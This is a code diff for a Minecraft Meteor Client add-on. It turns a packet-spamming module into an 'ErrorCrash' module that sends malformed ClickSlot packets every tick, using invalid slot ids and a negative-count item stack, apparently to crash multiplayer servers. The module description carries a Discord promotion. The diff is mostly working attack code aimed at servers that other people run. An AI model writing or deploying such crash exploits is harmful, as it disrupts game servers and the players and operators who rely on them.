@@ -1,27 +1,27 @@
 package widecat.meteorcrashaddon.modules;
 
+import it.unimi.dsi.fastutil.ints.Int2ObjectArrayMap;
+import it.unimi.dsi.fastutil.ints.Int2ObjectMap;
 import meteordevelopment.meteorclient.events.game.GameLeftEvent;
 import meteordevelopment.meteorclient.events.world.TickEvent;
-import meteordevelopment.meteorclient.settings.BoolSetting;
-import meteordevelopment.meteorclient.settings.IntSetting;
-import meteordevelopment.meteorclient.settings.Setting;
-import meteordevelopment.meteorclient.settings.SettingGroup;
+import meteordevelopment.meteorclient.settings.*;
 import meteordevelopment.meteorclient.systems.modules.Module;
 import meteordevelopment.orbit.EventHandler;
-import net.minecraft.network.packet.c2s.play.HandSwingC2SPacket;
-import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;
-import net.minecraft.util.Hand;
+import net.minecraft.item.ItemStack;
+import net.minecraft.item.Items;
+import net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket;
+import net.minecraft.screen.slot.SlotActionType;
 import widecat.meteorcrashaddon.CrashAddon;
 
-public class PacketSpammer extends Module {
+public class ErrorCrash extends Module {
     private final SettingGroup sgGeneral = settings.getDefaultGroup();
 
     private final Setting<Integer> amount = sgGeneral.add(new IntSetting.Builder()
         .name("amount")
-        .description("How many packets to send to the server per tick.")
-        .defaultValue(100)
+        .description("Packets per tick")
+        .defaultValue(15)
         .min(1)
-        .sliderMax(1000)
+        .sliderMax(100)
         .build());
 
     private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
@@ -30,15 +30,16 @@ public class PacketSpammer extends Module {
         .defaultValue(true)
         .build());
 
-    public PacketSpammer() {
-        super(CrashAddon.CATEGORY, "packet-spammer", "Spams random packets (fucking useless)");
+    public ErrorCrash() {
+        super(CrashAddon.CATEGORY, "error-crash", "i love discord.gg/g42rvX3c6s!!!!!");
     }
 
     @EventHandler
     private void onTick(TickEvent.Post event) {
+        Int2ObjectMap<ItemStack> REAL = new Int2ObjectArrayMap<>();
+        REAL.put(0, new ItemStack(Items.RED_DYE, 1));
         for (int i = 0; i < amount.get(); i++) {
-            mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.OnGroundOnly(Math.random() >= 0.5));
-            mc.getNetworkHandler().sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));
+            mc.getNetworkHandler().sendPacket(new ClickSlotC2SPacket(mc.player.currentScreenHandler.syncId,123344, 2957234, 2859623, SlotActionType.PICKUP, new ItemStack(Items.AIR, -1), REAL));
         }
     }
 
